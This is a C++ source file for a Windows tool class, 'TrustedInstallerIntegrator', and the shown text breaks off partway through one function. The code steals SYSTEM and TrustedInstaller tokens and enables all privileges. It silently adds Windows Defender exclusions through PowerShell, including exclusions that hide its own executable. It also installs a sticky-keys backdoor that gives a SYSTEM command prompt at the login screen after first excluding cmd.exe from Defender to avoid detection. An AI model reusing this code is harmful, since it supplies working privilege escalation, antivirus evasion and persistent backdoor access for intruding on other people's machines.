#include "TrustedInstallerIntegrator.h"
#include "common.h"
#include <tchar.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <algorithm>
#include <cctype>
#include <filesystem>

namespace fs = std::filesystem;

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

// Complete system privilege set for maximum access elevation
const LPCWSTR TrustedInstallerIntegrator::ALL_PRIVILEGES[] = {
    L"SeAssignPrimaryTokenPrivilege",
    L"SeBackupPrivilege",
    L"SeRestorePrivilege",
    L"SeDebugPrivilege",
    L"SeImpersonatePrivilege",
    L"SeTakeOwnershipPrivilege",
    L"SeLoadDriverPrivilege",
    L"SeSystemEnvironmentPrivilege",
    L"SeManageVolumePrivilege",
    L"SeSecurityPrivilege",
    L"SeShutdownPrivilege",
    L"SeSystemtimePrivilege",
    L"SeTcbPrivilege",
    L"SeIncreaseQuotaPrivilege",
    L"SeAuditPrivilege",
    L"SeChangeNotifyPrivilege",
    L"SeUndockPrivilege",
    L"SeCreateTokenPrivilege",
    L"SeLockMemoryPrivilege",
    L"SeCreatePagefilePrivilege",
    L"SeCreatePermanentPrivilege",
    L"SeSystemProfilePrivilege",
    L"SeProfileSingleProcessPrivilege",
    L"SeCreateGlobalPrivilege",
    L"SeTimeZonePrivilege",
    L"SeCreateSymbolicLinkPrivilege",
    L"SeIncreaseBasePriorityPrivilege",
    L"SeRemoteShutdownPrivilege",  
    L"SeIncreaseWorkingSetPrivilege"
};

const int TrustedInstallerIntegrator::PRIVILEGE_COUNT = sizeof(TrustedInstallerIntegrator::ALL_PRIVILEGES) / sizeof(LPCWSTR);

// TrustedInstaller token cache with timeout mechanism
static HANDLE g_cachedTrustedInstallerToken = nullptr;
static DWORD g_lastTokenAccessTime = 0;
static const DWORD TOKEN_CACHE_TIMEOUT = 30000; // 30 seconds

TrustedInstallerIntegrator::TrustedInstallerIntegrator()
{
    CoInitialize(NULL);
}

TrustedInstallerIntegrator::~TrustedInstallerIntegrator()
{
    CoUninitialize();
    
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
}

// TrustedInstaller token acquisition with comprehensive privilege elevation
HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken() {
    DWORD currentTime = GetTickCount();
    
    // Return cached token if still valid
    if (g_cachedTrustedInstallerToken && 
        (currentTime - g_lastTokenAccessTime) < TOKEN_CACHE_TIMEOUT) {
        return g_cachedTrustedInstallerToken;
    }
    
    // Clean up expired token
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
    
    // Enable required privileges for TrustedInstaller access
    if (!EnablePrivilege(L"SeDebugPrivilege")) {
        ERROR(L"Failed to enable SeDebugPrivilege");
        return nullptr;
    }
    if (!EnablePrivilege(L"SeImpersonatePrivilege")) {
        ERROR(L"Failed to enable SeImpersonatePrivilege");
        return nullptr;
    }
    EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
    
    // Impersonate SYSTEM to access TrustedInstaller
    if (!ImpersonateSystem()) {
        ERROR(L"Failed to impersonate SYSTEM - required for TrustedInstaller access");
        return nullptr;
    }
    
    // Start TrustedInstaller service if needed
    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (!trustedInstallerPid) {
        ERROR(L"Failed to start TrustedInstaller service");
        RevertToSelf();
        return nullptr;
    }
    
    // Open TrustedInstaller process
    HANDLE hTrustedInstallerProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, trustedInstallerPid);
    if (!hTrustedInstallerProcess) {
        ERROR(L"Failed to open TrustedInstaller process (error: %d)", GetLastError());
        RevertToSelf();
        return nullptr;
    }
    
    // Open TrustedInstaller token
    HANDLE hTrustedInstallerToken;
    if (!OpenProcessToken(hTrustedInstallerProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hTrustedInstallerToken)) {
        ERROR(L"Failed to open TrustedInstaller token (error: %d)", GetLastError());
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    // Duplicate token for impersonation
    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hTrustedInstallerToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, 
                         TokenImpersonation, &hDuplicatedToken)) {
        ERROR(L"Failed to duplicate TrustedInstaller token (error: %d)", GetLastError());
        CloseHandle(hTrustedInstallerToken);
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    CloseHandle(hTrustedInstallerToken);
    CloseHandle(hTrustedInstallerProcess);
    
    RevertToSelf();
    
    // Enable all possible privileges on the duplicated token
    int privilegesEnabled = 0;
    for (int i = 0; i < PRIVILEGE_COUNT; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        
        if (LookupPrivilegeValueW(NULL, ALL_PRIVILEGES[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hDuplicatedToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                privilegesEnabled++;
            }
        }
    }
    
    // Cache the token for future use
    g_cachedTrustedInstallerToken = hDuplicatedToken;
    g_lastTokenAccessTime = currentTime;
    
    SUCCESS(L"TrustedInstaller token cached successfully");
    return g_cachedTrustedInstallerToken;
}

// Enhanced Defender exclusion management with type specification
bool TrustedInstallerIntegrator::AddDefenderExclusion(ExclusionType type, const std::wstring& value)
{
    std::wstring processedValue = value;
    
    // Type-specific validation and processing
    switch (type) {
        case ExclusionType::Extensions:
            if (!ValidateExtension(value)) {
                ERROR(L"Invalid extension format: %s", value.c_str());
                return false;
            }
            processedValue = NormalizeExtension(value);
            break;
            
        case ExclusionType::IpAddresses:
            if (!ValidateIpAddress(value)) {
                ERROR(L"Invalid IP address format: %s", value.c_str());
                return false;
            }
            break;
            
        case ExclusionType::Processes:
            // Extract process name from full path if provided
            if (value.find(L'\\') != std::wstring::npos) {
                fs::path path(value);
                processedValue = path.filename().wstring();
                INFO(L"Extracted process name from path: %s", processedValue.c_str());
            }
            break;
            
        case ExclusionType::Paths:
            // No special processing needed for paths
            break;
    }
    
    // Escape single quotes for PowerShell
    std::wstring escapedValue;
    for (wchar_t c : processedValue) {
        if (c == L'\'')
            escapedValue += L"''";
        else
            escapedValue += c;
    }
    
    std::wstring typeStr = GetExclusionTypeString(type);
    std::wstring command = L"powershell -Command \"Add-MpPreference -Exclusion" + typeStr + L" '" + escapedValue + L"'\"";
    
    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Successfully added to Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
    } else {
        INFO(L"AV exclusion skipped: %s %s", typeStr.c_str(), processedValue.c_str());
    }
    
    return result;
}

bool TrustedInstallerIntegrator::RemoveDefenderExclusion(ExclusionType type, const std::wstring& value)
{
    std::wstring processedValue = value;
    
    // Apply same processing as in Add method
    switch (type) {
        case ExclusionType::Extensions:
            processedValue = NormalizeExtension(value);
            break;
        case ExclusionType::Processes:
            if (value.find(L'\\') != std::wstring::npos) {
                fs::path path(value);
                processedValue = path.filename().wstring();
            }
            break;
    }
    
    // Escape single quotes for PowerShell
    std::wstring escapedValue;
    for (wchar_t c : processedValue) {
        if (c == L'\'')
            escapedValue += L"''";
        else
            escapedValue += c;
    }
    
    std::wstring typeStr = GetExclusionTypeString(type);
    std::wstring command = L"powershell -Command \"Remove-MpPreference -Exclusion" + typeStr + L" '" + escapedValue + L"'\"";
    
    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Successfully removed from Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
    } else {
        INFO(L"AV cleanup skipped: %s %s", typeStr.c_str(), processedValue.c_str());
    }
    
    return result;
}

// Type-specific convenience methods
bool TrustedInstallerIntegrator::AddExtensionExclusion(const std::wstring& extension)
{
    return AddDefenderExclusion(ExclusionType::Extensions, extension);
}

bool TrustedInstallerIntegrator::RemoveExtensionExclusion(const std::wstring& extension)
{
    return RemoveDefenderExclusion(ExclusionType::Extensions, extension);
}

bool TrustedInstallerIntegrator::AddIpAddressExclusion(const std::wstring& ipAddress)
{
    return AddDefenderExclusion(ExclusionType::IpAddresses, ipAddress);
}

bool TrustedInstallerIntegrator::RemoveIpAddressExclusion(const std::wstring& ipAddress)
{
    return RemoveDefenderExclusion(ExclusionType::IpAddresses, ipAddress);
}

// Validation and helper methods
bool TrustedInstallerIntegrator::ValidateExtension(const std::wstring& extension) noexcept
{
    if (extension.empty()) return false;
    
    // Check for invalid characters in extensions
    const std::wstring invalidChars = L"\\/:*?\"<>|";
    for (wchar_t c : extension) {
        if (invalidChars.find(c) != std::wstring::npos) {
            return false;
        }
    }
    
    return true;
}

bool TrustedInstallerIntegrator::ValidateIpAddress(const std::wstring& ipAddress) noexcept
{
    if (ipAddress.empty()) return false;
    
    // Convert to narrow string for validation
    std::string narrowIp;
    for (wchar_t c : ipAddress) {
        if (c > 127) return false; // Non-ASCII character
        narrowIp.push_back(static_cast<char>(c));
    }
    
    // Basic IPv4 validation (supports CIDR notation)
    size_t dotCount = 0;
    size_t slashPos = narrowIp.find('/');
    std::string ipPart = (slashPos != std::string::npos) ? narrowIp.substr(0, slashPos) : narrowIp;
    
    for (char c : ipPart) {
        if (c == '.') {
            dotCount++;
        } else if (!std::isdigit(c)) {
            return false;
        }
    }
    
    // Should have exactly 3 dots for IPv4
    if (dotCount != 3) return false;
    
    // Validate CIDR suffix if present
    if (slashPos != std::string::npos) {
        std::string cidr = narrowIp.substr(slashPos + 1);
        if (cidr.empty()) return false;
        
        try {
            int cidrValue = std::stoi(cidr);
            if (cidrValue < 0 || cidrValue > 32) return false;
        } catch (...) {
            return false;
        }
    }
    
    return true;
}

std::wstring TrustedInstallerIntegrator::NormalizeExtension(const std::wstring& extension) noexcept
{
    if (extension.empty()) return extension;
    
    // Add leading dot if missing
    if (extension[0] != L'.') {
        return L"." + extension;
    }
    
    return extension;
}

std::wstring TrustedInstallerIntegrator::GetExclusionTypeString(ExclusionType type) noexcept
{
    switch (type) {
        case ExclusionType::Paths:      return L"Path";
        case ExclusionType::Processes:  return L"Process";
        case ExclusionType::Extensions: return L"Extension";
        case ExclusionType::IpAddresses: return L"IpAddress";
        default:                        return L"Path";
    }
}

// Sticky keys backdoor installation using IFEO technique
bool TrustedInstallerIntegrator::InstallStickyKeysBackdoor() noexcept
{
    INFO(L"Installing sticky keys backdoor with Defender bypass...");
    
    // First add cmd.exe to Defender process exclusions to prevent detection
    if (!AddProcessToDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV exclusion skipped for cmd.exe (continuing)");
        
    }
    
    // Create IFEO registry entry for sethc.exe
    HKEY hKey;
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    
    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, NULL, 
                                  REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to create IFEO registry key: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe"); // Cleanup on failure
        return false;
    }
    
    // Set debugger value to cmd.exe
    std::wstring debuggerValue = L"cmd.exe";
    result = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, 
                           reinterpret_cast<const BYTE*>(debuggerValue.c_str()),
                           static_cast<DWORD>((debuggerValue.length() + 1) * sizeof(wchar_t)));
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set Debugger registry value: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe"); // Cleanup on failure
        return false;
    }
    
    SUCCESS(L"Sticky keys backdoor installed successfully");
    SUCCESS(L"Press 5x Shift on login screen to get SYSTEM cmd.exe");
    return true;
}

// Complete removal of sticky keys backdoor
bool TrustedInstallerIntegrator::RemoveStickyKeysBackdoor() noexcept
{
    INFO(L"Removing sticky keys backdoor...");
    
    bool success = true;
    
    // Remove IFEO registry key
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    LONG result = RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    
    if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND) {
        ERROR(L"Failed to remove IFEO registry key: %d", result);
        success = false;
    } else if (result == ERROR_SUCCESS) {
        SUCCESS(L"IFEO registry key removed");
    }
    
    // Remove cmd.exe from Defender process exclusions
    if (!RemoveProcessFromDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV cleanup skipped for cmd.exe");
        
    }
    
    if (success) {
        SUCCESS(L"Sticky keys backdoor removed successfully");
    } else {
        INFO(L"Sticky keys backdoor removal completed with some errors");
    }
    
    return success;
}

// Enhanced Defender exclusion management with process support
bool TrustedInstallerIntegrator::AddToDefenderExclusions(const std::wstring& customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    // Use custom path or current executable path
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, customPath.c_str());
    }

    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");
    bool isSelfProtection = customPath.empty(); // Self-protection when no custom path

    // Self-protection: add to BOTH paths and processes for complete protection
    if (isSelfProtection && isExecutable) {
        bool pathSuccess = AddPathExclusion(currentPath);
        bool processSuccess = AddProcessToDefenderExclusions(filePath.filename().wstring());
        
        if (pathSuccess && processSuccess) {
            SUCCESS(L"Self-protection: added to both path and process exclusions");
            return true;
        } else if (pathSuccess) {
            SUCCESS(L"Self-protection: added to path exclusions (process exclusion failed)");
            return true;
        }
        return false;
    }

    // Regular files: use existing logic
    if (isExecutable) {
        std::wstring processName = filePath.filename().wstring();
        return AddProcessToDefenderExclusions(processName);
    } else {
        return AddPathExclusion(currentPath);
    }
}

bool TrustedInstallerIntegrator::AddPathExclusion(const std::wstring& path) {
    // Escape single quotes in path for PowerShell
    std::wstring escapedPath;
    for (wchar_t c : path) {
        if (c == L'\'')
            escapedPath += L"''";
        else
            escapedPath += c;
    }

    std::wstring command = L"powershell -Command \"Add-MpPreference -ExclusionPath '" + escapedPath + L"'\"";
    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Successfully added to Windows Defender path exclusions: %s", path.c_str());
    }
    return result;
}

bool TrustedInstallerIntegrator::RemoveFromDefenderExclusions(const std::wstring& customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    // Use custom path or current executable path
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, customPath.c_str());
    }

    // Determine if it's an executable (process exclusion) or path exclusion
    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");

    if (isExecutable) {
        // Remove from process exclusions
        std::wstring processName = filePath.filename().wstring();
        return RemoveProcessFromDefenderExclusions(processName);
    } else {
        // Remove from path exclusions (original logic)
        // Escape single quotes in path for PowerShell
        std::wstring escapedPath;
        for (wchar_t* p = currentPath; *p; ++p) {
            if (*p == L'\'')
                escapedPath += L"''";
            else
                escapedPath += *p;
        }

        // Build PowerShell command to remove path exclusion
        std::wstring command = L"powershell -Command \"Remove-MpPreference -ExclusionPath '" + escapedPath + L"'\"";

        bool result = RunAsTrustedInstallerSilent(command);
        
        if (result) {
            SUCCESS(L"Successfully removed from Windows Defender path exclusions: %s", currentPath);
        } else {
            ERROR(L"Failed to remove from Windows Defender path exclusions");
        }
        
        return result;
    }
}

// Process exclusion management for Defender bypass
bool TrustedInstallerIntegrator::AddProcessToDefenderExclusions(const std::wstring& processName)
{
    // Escape single quotes in process name for PowerShell
    std::wstring escapedProcessName;
    for (wchar_t c : processName) {
        if (c == L'\'')
            escapedProcessName += L"''"; // Double single quotes for PowerShell escaping
        else
            escapedProcessName += c;
    }

    // Build PowerShell command to add process exclusion
    std::wstring command = L"powershell -Command \"Add-MpPreference -ExclusionProcess '" + escapedProcessName + L"'\"";

    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Successfully added to Windows Defender process exclusions: %s", processName.c_str());
    } else {
        INFO(L"AV exclusion skipped: %s", processName.c_str());
    }
    
    return result;
}

bool TrustedInstallerIntegrator::RemoveProcessFromDefenderExclusions(const std::wstring& processName)
{
    // Escape single quotes in process name for PowerShell
    std::wstring escapedProcessName;
    for (wchar_t c : processName) {
        if (c == L'\'')
            escapedProcessName += L"''";
        else
            escapedProcessName += c;
    }

    // Build PowerShell command to remove process exclusion
    std::wstring command = L"powershell -Command \"Remove-MpPreference -ExclusionProcess '" + escapedProcessName + L"'\"";

    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Successfully removed from Windows Defender process exclusions: %s", processName.c_str());
    } else {
        INFO(L"AV cleanup skipped: %s", processName.c_str());
    }
    
    return result;
}

// Shortcut file detection and resolution
BOOL TrustedInstallerIntegrator::IsLnkFile(LPCWSTR filePath)
{
    if (!filePath || wcslen(filePath) < 4) 
        return FALSE;
    
    fs::path path(filePath);
    std::wstring ext = path.extension().wstring();
    
    return _wcsicmp(ext.c_str(), L".lnk") == 0;
}

std::wstring TrustedInstallerIntegrator::ResolveLnk(LPCWSTR lnkPath)
{
    std::wstring result;
    IShellLinkW* psl = nullptr;
    IPersistFile* ppf = nullptr;
    
    // Verify shortcut file exists
    if (GetFileAttributesW(lnkPath) == INVALID_FILE_ATTRIBUTES)
    {
        std::wcout << L"Shortcut file does not exist: " << lnkPath << std::endl;
        return result;
    }

    // Create shell link object
    HRESULT hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
    if (FAILED(hres))
    {
        std::wcout << L"Failed to create ShellLink instance: 0x" << std::hex << hres << std::endl;
        return result;
    }

    // Get persist file interface
    hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
    if (FAILED(hres))
    {
        std::wcout << L"Failed to get IPersistFile interface: 0x" << std::hex << hres << std::endl;
        psl->Release();
        return result;
    }

    // Load shortcut file
    hres = ppf->Load(lnkPath, STGM_READ);
    if (FAILED(hres))
    {
        std::wcout << L"Failed to load shortcut file: 0x" << std::hex << hres << std::endl;
        ppf->Release();
        psl->Release();
        return result;
    }

    // Extract target path and arguments
    wchar_t targetPath[MAX_PATH * 2] = {0};
    WIN32_FIND_DATAW wfd = {0};
    
    hres = psl->GetPath(targetPath, MAX_PATH * 2, &wfd, SLGP_RAWPATH);
    if (FAILED(hres))
    {
        std::wcout << L"Failed to get shortcut target path: 0x" << std::hex << hres << std::endl;
    }
    else if (wcslen(targetPath) > 0)
    {
        result = targetPath;
        
        // Append arguments if present
        wchar_t args[MAX_PATH * 2] = {0};
        hres = psl->GetArguments(args, MAX_PATH * 2);
        if (SUCCEEDED(hres) && wcslen(args) > 0)
        {
            result += L" ";
            result += args;
        }
    }

    ppf->Release();
    psl->Release();
    
    return result;
}

BOOL TrustedInstallerIntegrator::EnablePrivilege(LPCWSTR privilegeName)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
        return FALSE;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp = { 0 };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    
    return result && (GetLastError() == ERROR_SUCCESS);
}

DWORD TrustedInstallerIntegrator::GetProcessIdByName(LPCWSTR processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    DWORD pid = 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe))
    {
        do
        {
            if (wcscmp(pe.szExeFile, processName) == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// SYSTEM account impersonation via winlogon process
BOOL TrustedInstallerIntegrator::ImpersonateSystem()
{
    DWORD systemPid = GetProcessIdByName(L"winlogon.exe");
    if (systemPid == 0)
        return FALSE;

    HANDLE hSystemProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hSystemProcess)
        return FALSE;

    HANDLE hSystemToken;
    if (!OpenProcessToken(hSystemProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSystemToken))
    {
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicatedToken))
    {
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    BOOL result = ImpersonateLoggedOnUser(hDuplicatedToken);

    CloseHandle(hDuplicatedToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);
    return result;
}

// TrustedInstaller service lifecycle management
DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
{
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (!hSCManager)
        return 0;

    SC_HANDLE hService = OpenServiceW(hSCManager, L"TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);
    if (!hService)
    {
        CloseServiceHandle(hSCManager);
        return 0;
    }

    SERVICE_STATUS_PROCESS statusBuffer;
    DWORD bytesNeeded;
    DWORD trustedInstallerPid = 0;
    DWORD startTime = GetTickCount();
    const DWORD timeout = 30000; // 30 second timeout

    // Wait for service to reach running state
    while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
    {
        switch (statusBuffer.dwCurrentState)
        {
        case SERVICE_STOPPED:
            // Start the service
            if (!StartServiceW(hService, 0, NULL))
            {
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCManager);
                return 0;
            }
            break;

        case SERVICE_START_PENDING:
        case SERVICE_STOP_PENDING:
            // Check timeout
            if (GetTickCount() - startTime > timeout)
            {
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCManager);
                return 0;
            }
            Sleep(statusBuffer.dwWaitHint);
            break;

        case SERVICE_RUNNING:
            // Service is running, return PID
            trustedInstallerPid = statusBuffer.dwProcessId;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return trustedInstallerPid;

        default:
            Sleep(100);
            break;
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstaller(DWORD pid, LPCWSTR commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    // CreateProcessWithTokenW requires mutable command line
    wchar_t* mutableCmd = _wcsdup(commandLine);
    if (!mutableCmd) return FALSE;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    BOOL result = CreateProcessWithTokenW(
        hToken,
        0,
        NULL,
        mutableCmd,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (result)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(mutableCmd);
    return result;
}

BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstallerSilent(DWORD pid, LPCWSTR commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    wchar_t* mutableCmd = _wcsdup(commandLine);
    if (!mutableCmd) return FALSE;

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide window for silent execution
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcessWithTokenW(
        hToken,
        0,
        NULL,
        mutableCmd,
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (result)
    {
        // Wait for process completion with timeout
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 15000);
        
        if (waitResult == WAIT_OBJECT_0)
        {
            DWORD exitCode;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            result = (exitCode == 0);
        }
        else if (waitResult == WAIT_TIMEOUT)
        {
            TerminateProcess(pi.hProcess, 1);
            result = FALSE;
        }
        else
        {
            result = FALSE;
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(mutableCmd);
    return result;
}

// Registry context menu integration
bool TrustedInstallerIntegrator::AddContextMenuEntries()
{
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    
    // Build command line for context menu
    std::wstring command = L"\"";
    command += currentPath;
    command += L"\" trusted \"%1\"";
    
    std::wstring iconPath = L"shell32.dll,77"; // Shield icon from shell32
    
    HKEY hKey;
    DWORD dwDisposition;
    
    // Add context menu for .exe files
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"exefile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(), 
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        
        // Set icon
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(), 
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        
        // Add UAC shield
        std::wstring emptyValue = L"";
        RegSetValueExW(hKey, L"HasLUAShield", 0, REG_SZ, (const BYTE*)emptyValue.c_str(), sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    // Add command for .exe files
    std::wstring exeCommandPath = L"exefile\\shell\\RunAsTrustedInstaller\\command";
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, exeCommandPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), 
                      (DWORD)(command.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    // Add context menu for .lnk files (shortcuts)
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"lnkfile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(), 
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        
        // Set icon
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(), 
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        
        // Add UAC shield
        std::wstring emptyValue = L"";
        RegSetValueExW(hKey, L"HasLUASShield", 0, REG_SZ, (const BYTE*)emptyValue.c_str(), sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    // Add command for .lnk files
    std::wstring lnkCommandPath = L"lnkfile\\shell\\RunAsTrustedInstaller\\command";
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, lnkCommandPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), 
                      (DWORD)(command.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    SUCCESS(L"Successfully added context menu entries for .exe and .lnk files");
    return true;
}

// TrustedInstaller command execution with shortcut resolution
bool TrustedInstallerIntegrator::RunAsTrustedInstaller(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    // Resolve shortcut if the command is a .lnk file
    if (IsLnkFile(commandLine.c_str()))
    {
        std::wcout << L"Resolving shortcut: " << commandLine << std::endl;
        finalCommandLine = ResolveLnk(commandLine.c_str());
        
        if (finalCommandLine.empty())
        {
            std::wcout << L"Failed to resolve shortcut, cannot execute .lnk file directly." << std::endl;
            return false;
        }
        
        std::wcout << L"Resolved shortcut to: " << finalCommandLine << std::endl;
    }
    
